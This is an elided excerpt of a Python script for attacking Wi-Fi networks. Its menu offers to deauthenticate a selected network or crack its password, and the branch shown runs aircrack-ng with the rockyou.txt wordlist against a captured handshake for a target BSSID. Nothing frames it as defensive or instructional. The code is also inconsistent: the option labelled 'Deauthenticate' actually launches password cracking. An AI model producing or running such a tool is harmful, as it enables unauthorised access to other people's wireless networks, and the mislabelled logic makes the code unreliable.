...
while True:
    print("\nSelect an action:")
    print("0 - Deauthenticate the selected Wi-Fi")
    print("1 - Try to find the password of the selected Wi-Fi")
    action_choice = input("Enter your choice: ")
    try:
        action_choice = int(action_choice)
        if action_choice in [0, 1]:
            break
    except:
...
if action_choice == 0:
    ...
    print("Starting password cracking process...")
    handshake_file = input("Enter the path to the handshake capture file (e.g., .cap file): ")
    wordlist_file = "/usr/share/wordlists/rockyou.txt"
    print(f"Using wordlist: {wordlist_file}")
    subprocess.run(["aircrack-ng", "-w", wordlist_file, "-b", hackbssid, handshake_file])
